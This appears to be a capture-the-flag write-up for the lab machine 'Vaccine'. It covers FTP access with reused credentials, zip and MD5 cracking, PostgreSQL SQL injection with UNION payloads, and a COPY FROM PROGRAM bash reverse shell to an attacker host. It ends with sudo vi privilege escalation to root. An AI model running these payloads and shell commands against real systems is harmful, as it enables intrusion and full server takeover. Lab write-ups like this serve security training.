## ------------------->> Vaccine <<-------------------

// We will start with scanning using nmap

    $ nmap -sV -A -Pn 10.10.10.46 -p-
    Nmap scan report for 10.10.10.46
    Host is up (0.23s latency).
    Not shown: 65532 closed ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
    |   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
    |_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: MegaCorp Login
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
// we got 3 services running (FTP,SSH,HTTP). since we got credentials from last box(Oopsie), we can try to connect to FTP 

    ftp -p 10.10.10.46 
    ftpuser : mc@F1l3ZilL4
// we locate file called backup.zip in the ftp shared directory, lets grab him

    ftp> ls
    227 Entering Passive Mode (10,10,10,46,39,53).
    150 Here comes the directory listing.
    -rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
    226 Directory send OK.

    ftp> get backup.zip
// its seems that file have password, lets crack the password using john

    $ zip2john backup.zip > hash
    $ john hash --fork=4 -w=/wordlist.txt
    backup.zip password : 741852963

// we got file called index.php

	index.php -> login admin password_md5 : "2cb42f8734ea607eefed3b70af13bbd3"
// decode the hash using online md5 decoder https://www.md5online.org/
![Image 1](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_14_10_35.png)

	"2cb42f8734ea607eefed3b70af13bbd3" -> qwerty789

// login to http://10.10.10.46/ with credentials 'admin : qwerty789' get us to car catatlog with a search bar
when i search for 'a' i can see that url changes to http://10.10.10.46/dashboard.php?search=a when i try to insert quots i get an error:

	ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
// now we can see that the server is vulnerable for sql injection
source: https://portswigger.net/web-security/sql-injection/union-attacks
// when we got the Error 
	
	ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
// we can see that we have a table called 'cars', to find how many columns are in that table we can inject :

	' ORDER BY 1--
// and increase the number(1 to 2 and 3 ...) 
// all works till ' ORDER BY 5--

	ERROR: syntax error at or near "BY5" LINE 1: Select * from cars where name ilike '%' ORDER BY5--%' ^
// now we will submitting a series of UNION SELECT payloads specifying a different number of null

    ' UNION SELECT 'a', NULL, NULL, NULL, NULL -- : 
	ERROR: invalid input syntax for integer: "a" LINE 1: ...ect * from cars where name ilike '%' UNION SELECT 'a', NULL,... ^
    ' UNION SELECT NULL, 'a', NULL, NULL, NULL -- : VALID
    ' UNION SELECT NULL, NULL, 'a', NULL, NULL -- : VALID
    ' UNION SELECT NULL, NULL, NULL, 'a', NULL -- : VALID
    ' UNION SELECT NULL, NULL, NULL, NULL, 'a' -- : VALID

// Insert:

	' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --

![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_14_40_43.png)
// set a listiner

	$ rlwrap nc -lvnp 1444
// Insert:

	'; CREATE TABLE cmd_exec(cmd_output text); --
	'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.16.7/1444 0>&1'''; --
// we got a shell!

	$ rlwrap nc -lvnp 1444
	listening on [any] 1444 ...
	connect to [10.10.16.7] from (UNKNOWN) [10.10.10.46] 41756
	bash: cannot set terminal process group (11360): Inappropriate ioctl for device
	bash: no job control in this shell
	postgres@vaccine:/var/lib/postgresql/11/main$ whoami
	whoami
	postgres
	postgres@vaccine:/var/lib/postgresql/11/main$ 

![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_13_41_32.png)

// There is another way to automate this process with using sqlmap tool

	$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=eig0j4h3v77v8prj79sug2hu50" --dump-all --tamper=space2comment
// and then

	sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=eig0j4h3v77v8prj79sug2hu50" --os-shell

// upgrade connection with nc listiner on port 1234

	bash -c 'bash -i >& /dev/tcp/10.10.16.7/1234 0>&1'

// upgrade nc shell

	SHELL=/bin/bash script -q /dev/null
// Now when we got shell lets dig in www/ directory

	postgres@vaccine:/var/www/html$ cat dashboard.php

	try {
	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
	}

// now we can upgrade our shell

	postgres@vaccine:$ python3 -c "import pty;pty.spawn('/bin/bash')"
	P@s5w0rd!
// Or just connect SSH

	ssh postgres@10.10.10.46
	P@s5w0rd!


// we can see that we root privilleged with vi to 'pg_hba.conf' configuration file

	postgres@vaccine:~$ sudo -l
	[sudo] password for postgres: 
	Matching Defaults entries for postgres on vaccine:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User postgres may run the following commands on vaccine:
	    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
// Run that file with sudo
	    
	postgres@vaccine:~$ sudo vi /etc/postgresql/11/main/pg_hba.conf 
// Enter

	root@vaccine:/var/lib/postgresql# id
	uid=0(root) gid=0(root) groups=0(root)
// we got the flag

	root@vaccine:~# cat root.txt
	dd6e058e8.................
